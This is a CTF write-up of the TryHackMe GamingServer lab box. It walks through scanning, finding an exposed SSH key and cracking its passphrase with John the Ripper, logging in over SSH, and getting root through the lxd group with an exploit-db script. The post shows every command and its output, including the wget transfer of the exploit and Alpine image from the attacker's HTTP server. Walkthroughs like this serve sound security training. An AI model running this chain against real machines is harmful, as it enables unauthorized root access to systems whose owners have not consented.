---
title: "THM GamingServer"
date: 2020-10-07 19:00:00 -0700
categories: [THM, writeup]
tags: [writeup]
toc: true
---

> GamingServer : An Easy Boot2Root box for beginners

## Introduction

TryHackMe's GamingServer is an easy box made for beginners. 

It took me around two hours from deploying the machine to rooting the machine.

I think this is a solid starter box for someone who cannot solve anything out on HackTheBox yet, although this is definetely a lot easier than any of the boxes you can find on HackTheBox.

## nmap

As with all machines, the first thing we do is an nmap scan to get an idea of what is running on the box.

``nmap -sC -sV -o nmap.nmap 10.10.242.31``

Here is the output of the scan: 

```
kali@kali:~/Desktop/thm/gamingserver$ nmap -sC -sV -o nmap.nmap 10.10.242.31
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 21:46 EDT
Nmap scan report for 10.10.242.31
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.17 seconds

```

Port 22 (SSH) and Port 80 (A web server) are open. It looks like the web server is utilizing apache, which is important information that will help us out later. Since we know that these two basic protocols are being run, we need to decide what exactly we want to attack. SSH is almost never an initial attack vector, so the next step would be to go to the web server and look for more information and find something to exploit.

## Enumeration

We can access the website using the box's ip address and putting it into the url bar in the browser (10.10.242.31).

![site](https://i.imgur.com/up99fgP.png)

Interesting website, it reminds me of Wizard101 and other MMO games from a few years ago. 

A few things I noticed off the bat: a lot of the website's functions lead to other functions on the website. The three buttons on the bottom correspond with the three buttons on the top. The first page doesn't appear to have anything special on it, but the second page has an interesting button.


![site2](https://i.imgur.com/6Qy6p3L.png)

Normal websites don't exactly have an uploads page public like that.. Let's click the button and check it out.

![uploads](https://i.imgur.com/TNLf6pJ.png)

Cool! Three files. 

The ``manifesto.txt`` file appears to be the ``Hacker's Manifesto`` copypasta that appears often in CTF challenges.

I could not find anything special with it.

There's an image ``meme.jpg`` that doesn't appear to have anything useful on it. I ran through some common stego tactics, ``strings``, ``steghide`` with no password, ``stegsolve.jar``, ``exiftool``, etc and nothing noteworthy came up.

The last file, ``dict.lst`` is interesting. Let's take a look at it:

![dictlst](https://i.imgur.com/gRRMKiq.png)

If anything, this looks like a wordlist. It will be useful if there's a login page or some configuration file with a hash that we can bruteforce later. For now, let's keep enumerating.

At this point, I decided to run a gobuster scan. Gobuster bruteforces for directories, so if something like x.x.x.x/login exists, it will find it and report back to me. There's a massive list of potential directories called ``big.txt`` that comes with Kali, so I will use this wordlist to try and find something interesting.

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.242.31
```


```
kali@kali:~/Desktop/thm/gamingserver$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.242.31
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.242.31
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 22:04:45 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2020/10/07 22:09:58 Finished
===============================================================
```

Awesome! We now know of three new things, ``secret``, ``server-status``, and ``robots.txt``. Usually, ``robots.txt`` is the first thing you check when doing enumertion, so let's check it out quickly.

```
user-agent: *
Allow: /
/uploads/
```

We've already seen ``/uploads/`` so this isn't useful for us. ``server-status`` has a 403 error which means it is forbidden and we cannot view it. Let's move onto ``/secret``.

![secret](https://i.imgur.com/QKm2uWt.png)

secretKey? Let's download it and take a look at it.

![secretcontent](https://i.imgur.com/iSVOKLd.png)

An RSA private key! From experience I know that this is used for SSH. While we have this, we don't exactly have a username for SSH yet. Let's head back to the website to try and find something that can help us. 

I went through the source code of the index/landing page of the website and found this comment. 

![username](https://i.imgur.com/0hMjCh5.png)

Looks like ``john`` or some variation of john is a potential username. Awesome! Let's go back to the private key.

While we do have this file, we still cannot really use it for anything as it is encrypted. If we are able to "crack" it, we will then be able to use the file to make use of the open SSH connection.

In order to crack a private key like this, I will use the tool ``John The Ripper``. This tool can crack more or less anything, but it does it in an interesting way. You have to use a script to convert the prviate key file into a format that John can crack with. If something on the internet exists, there's probably a module to convert it into a format that John can use. 

I found a solid guide on this topic here: https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/. I downloaded the script from [here](https://github.com/truongkma/ctf-tools/blob/master/John/run/sshng2john.py).

Use the script like this: 

![ssh2john](https://i.imgur.com/Hig5ErA.png)

```
python sshng2john.py secretKey > crackme
```

![key](https://i.imgur.com/kzxjJ4M.png)

**Make sure you remove the integer at the start of the file, i used the text editor nano to do it. The output on bottom is what you should have before cracking**

Awesome, now we have the secret key in a format that john can crack. 

Looking back on what we found before, we have a potential wordlist ``dict.lst`` that was in the uploads directory. Let's use that to try and crack the private key.

```
kali@kali:~/Desktop/thm/gamingserver$ sudo john --wordlist dict.lst crackme --format=SSH
```

```
kali@kali:~/Desktop/thm/gamingserver$ sudo john --wordlist dict.lst crackme --format=SSH
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
1g 0:00:00:00 DONE (2020-10-07 22:49) 100.0g/s 354600p/s 354600c/s 354600C/s paagal..sss
```

Password: ``letmein``

Awesome! Now let's try to ssh into the machine. Here is the format you would use to do this:

```
ssh <user>@<ip> -i <identity file>
```

Before we use the private key, we need to set permissions for it. Use the following command to do so:

```
kali@kali:~/Desktop/thm/gamingserver$ chmod 600 secretKey
```

Now let's try to login via ssh.

```
ssh john@10.10.242.31 -i secretKey
```

```
kali@kali:~/Desktop/thm/gamingserver$ ssh john@10.10.242.31 -i secretKey
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct  8 02:53:33 UTC 2020

  System load:  0.0               Processes:           98
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.242.31
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
```

We're in! 

```
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt 
<redacted>
```

Awesome!

## Priv Escalation

Now let's try to get root. Whenever you do a box, there are two commands you should ALWAYS use in an attempt to escalate privileges. These are ``sudo -l`` and ``id``. The former doesn't show anything, however the latter does.

```
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

The interesting thing here is ``108(lxd)``. Using this group, we are able to escalate privileges. It is a common vector on HackTheBox, and I have seen it twice in the past.

A quick google search brings up this exploit script: https://www.exploit-db.com/exploits/46978

```
# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine
```

Let's do this. On my attacker machine, I will type ``wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine``. 

Next, I will enter ``sudo bash build-alpine``. It failed to build the first time I tried it so I redownloaded the file above, tried again, and it worked!

```
kali@kali:~/Desktop/thm/gamingserver/priv$ ls
alpine-v3.12-x86_64-20201007_2302.tar.gz  build-alpine  exploit
```

Next, we need to transfer these two files to the victim machine. In order to this, we will set an HTTP server on the attacking machine and use ``wget`` to download the files on the victim machine. First, let's quickly rename the alphine file so it's easier to type in when we use the shell that does not have autocomplete.

```
kali@kali:~/Desktop/thm/gamingserver/priv$ mv alpine-v3.12-x86_64-20201007_2302.tar.gz alpine.tar.gz
kali@kali:~/Desktop/thm/gamingserver/priv$ ls
alpine.tar.gz  build-alpine  exploit
```

Cool, let's start the HTTP server.

```
kali@kali:~/Desktop/thm/gamingserver/priv$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now a http server is being run inside the folder with these files on port 8000. Let's find our IP address using the ``ip a`` command. 

My IP is ``10.2.19.105/17``, so the http server can be referenced using ``10.2.19.105:8000/<filename>``.

Switching back to the victim machine, let's download the files needed to run the exploit.

```
john@exploitable:~$ wget 10.2.19.105:8000/exploit
--2020-10-08 03:07:35--  http://10.2.19.105:8000/exploit
Connecting to 10.2.19.105:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1500 (1.5K) [application/octet-stream]
Saving to: ‘exploit’

exploit                                              100%[=====================================================================================================================>]   1.46K  --.-KB/s    in 0s      

2020-10-08 03:07:35 (75.4 MB/s) - ‘exploit’ saved [1500/1500]

john@exploitable:~$ wget 10.2.19.105:8000/alpine.tar.gz
--2020-10-08 03:07:53--  http://10.2.19.105:8000/alpine.tar.gz
Connecting to 10.2.19.105:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3210251 (3.1M) [application/gzip]
Saving to: ‘alpine.tar.gz’

alpine.tar.gz                                        100%[=====================================================================================================================>]   3.06M   359KB/s    in 11s     

2020-10-08 03:08:04 (280 KB/s) - ‘alpine.tar.gz’ saved [3210251/3210251]

john@exploitable:~$ ls
alpine.tar.gz  exploit  user.txt
john@exploitable:~$ 
```

Great! both the files have been downloaded. Let's mark the exploit so we can run it using ``chmod +x exploit`` and run it using ``./exploit``. 

Unfortauntely, I was getting an error when I tried to do this. 

```
/usr/bin/env: ‘bash\r’: No such file or directory
```

Using google led me to this thread: https://stackoverflow.com/questions/29045140/env-bash-r-no-such-file-or-directory/53943650

And this solution: 

```
sed $'s/\r$//' ./exploit > ./exploit.Unix
```
I removed the old file using ``rm exploit`` and renamed the new script using ``mv exploit.Unix exploit``. I marked the new script as an executable using ``chmod +x exploit``. 

```
john@exploitable:~$ ./exploit 

Usage:
        [-f] Filename (.tar.gz alpine file)
        [-h] Show this help panel
```

Awesome! It's all coming together (as they say)

Let's supply the filename

```
john@exploitable:~$ ./exploit -f alpine.tar.gz
Image imported with fingerprint: e9fd29615765f2128f4c64337688659b27420f0ae3421431a5bf4a49f225eb30
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| alpine | e9fd29615765 | no     | alpine v3.12 (20201007_23:02) | x86_64 | 3.06MB | Oct 8, 2020 at 3:25am (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # 
```

```
~ # whoami
root
```

It worked!

Let's go the root directory to claim the prize ;o

```
/ # cd /mnt/root/root/
/mnt/root/root # cat root.txt
<redacted>
/mnt/root/root # 
```

Awesome! Now I'll backtrack a little bit and explain how this works. This exploits abuses the fact that you are able to mount something to the filesystem. The exploit uses the permissions found using the ``id`` command to mount the root filesystem to ``/mnt/root``. If we were to access to access files outside of ``/mt/root``, we wouldn't be able to do something. The mount effectively takes a "snapshot" (not really but for the sake of understanding its a solid example) of everything from root's perspective and puts it in a place where we are able to access it. From that place, we are able to read ``/root/root.text``. 

## Conclusion

This is one of the easier boxes that I have completed. Gaining the initial shell was very simple and escalating privs had a few challenges but they were easily overcome. 

I think from now on, I'm going to take a break from HackTheBox as I've reached a wall where I'm unable to solve anything beyond an easy box. THM has a lot more boxes that cover several beginner topics and I intend to go through them all before returning to HackTheBox in the future.

*extra note*: check out [platinum disco](https://www.youtube.com/watch?v=zozE_RkLOp8) and [my soul your beats](https://www.youtube.com/watch?v=Turf7WDB3iY), these songs are great.